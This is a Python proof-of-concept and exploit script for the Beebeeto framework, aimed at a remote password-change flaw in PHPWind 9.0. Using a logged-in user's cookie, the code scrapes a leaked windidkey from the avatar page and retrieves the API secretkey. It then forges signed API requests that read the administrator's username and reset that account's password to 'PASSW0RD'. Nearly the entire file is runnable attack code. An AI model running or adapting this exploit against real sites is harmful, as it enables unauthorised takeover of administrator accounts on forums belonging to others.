#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import time
import json
import urllib
import urllib2


from hashlib import md5

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0204',
            'name': 'PHPWind 9.0 /src/windid/service/user/srv/WindidUserService.php 远程密码修改漏洞 POC & Exploit',
            'author': 'Evi1m0',
            'create_date': '2014-12-13',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpwind',
            'vul_version': ['9.0'],
            'type': 'Remote Password Change',
            'tag': ['phpwind漏洞', '远程密码修改漏洞', '/WindidUserService.php', 'php'],
            'desc': '''
                    phpwind v9.0版本中上传头像处误将访问api的密钥泄露，导致 secretkey 泄露，导致可通过api任意修改密码。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-072727',
            ],
        },
    }


    # The need for -c (cookie) parameters
    def _init_user_parser(self):
        self.user_parser.add_option('-c','--cookie',
                                    action='store', dest='cookie', type='string', default=None,
                                    help='this poc need to login, so special cookie '
                                    'for target must be included in http headers.')


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        headers_cookie = {"Cookie":args['options']['cookie']}
        windidkey_url = '%s/index.php?m=profile&c=avatar&_left=avatar' % url
        secretkey_url = '%s/windid/index.php?m=api&c=app&a=list&uid=%s&windidkey=%s&time=%s&clientid=1&type=flash'
        # Regex
        match_uid = re.compile('m=space&uid=([\d])+')
        match_windidkey = re.compile('windidkey%3D([\w\d]{32})%26time%3D([\d]+)%26')
        if args['options']['verbose']:
            print '[*] %s - Trying to get secret key' % url
        request = urllib2.Request(windidkey_url, headers=headers_cookie)
        response = urllib2.urlopen(request).read()

        # Get windidkey
        try:
            windidkey, _time = match_windidkey.findall(response)[0]
            uid = match_uid.findall(response)[0]
        except:
            return args

        # Get secretkey
        request = urllib2.Request(secretkey_url % (url, uid, windidkey, _time), data='uid=undefined')
        response = json.loads(urllib2.urlopen(request).read())
        try:
            secretkey = response['1']['secretkey']
        except:
            return args

        # Success
        if secretkey:
            args['success'] = True
            args['poc_ret']['vul_url'] = url
            args['poc_ret']['secretkey'] = secretkey
        return args


    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        headers_cookie = {"Cookie":args['options']['cookie']}
        vul_url = '%s/windid/index.php?m=api&c=user&a=%s&windidkey=%s&time=%s&clientid=1&userid=1'
        windidkey_url = '%s/index.php?m=profile&c=avatar&_left=avatar' % url
        secretkey_url = '%s/windid/index.php?m=api&c=app&a=list&uid=%s&windidkey=%s&time=%s&clientid=1&type=flash'
        # Regex
        match_uid = re.compile('m=space&uid=([\d])+')
        match_windidkey = re.compile('windidkey%3D([\w\d]{32})%26time%3D([\d]+)%26')
        if args['options']['verbose']:
            print '[*] %s - Trying to get secret key' % url
        request = urllib2.Request(windidkey_url, headers=headers_cookie)
        response = urllib2.urlopen(request).read()

        # Get windidkey
        try:
            windidkey, _time = match_windidkey.findall(response)[0]
            uid = match_uid.findall(response)[0]
        except:
            return args

        # Get secretkey
        request = urllib2.Request(secretkey_url % (url, uid, windidkey, _time), data='uid=undefined')
        response = json.loads(urllib2.urlopen(request).read())
        try:
            secretkey = response['1']['secretkey']
        except:
            return args
        if args['options']['verbose']:
            print '[*] %s - The secret key is %s' % (url, secretkey)

        # Get username
        if args['options']['verbose']:
            print '[*] %s - Getting Username ...' % url
        data = {'uid': 1}
        string = 'userid1uid1'
        _time = str(int(time.time()))
        app_key = md5('%s%s%s' % (md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
        request = urllib2.Request(vul_url % (url, 'get', app_key, _time), data=urllib.urlencode(data))
        response = json.loads(urllib2.urlopen(request).read())
        try:
            username = response[u'username']
        except:
            return args
        if args['options']['verbose']:
            print '[*] %s - The Username is %s' % (url, username)

        # Change password
        if args['options']['verbose']:
            print '[*] %s - Trying to change the %s\'s password ...' % (url ,username)
        data = {'password': 'PASSW0RD', 'uid': 1}
        string = 'userid1passwordPASSW0RDuid1'
        _time = str(int(time.time()))
        app_key = md5('%s%s%s' % (md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
        request = urllib2.Request(vul_url % (url, 'editUser', app_key, _time), data=urllib.urlencode(data))
        response = urllib2.urlopen(request).read()

        # Success
        if response == '1':
            args['success'] = True
            args['poc_ret']['vul_url'] = url
            args['poc_ret']['secretkey'] = secretkey
            args['poc_ret']['username'] = username
            args['poc_ret']['password'] = 'PASSW0RD'
        return args



if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())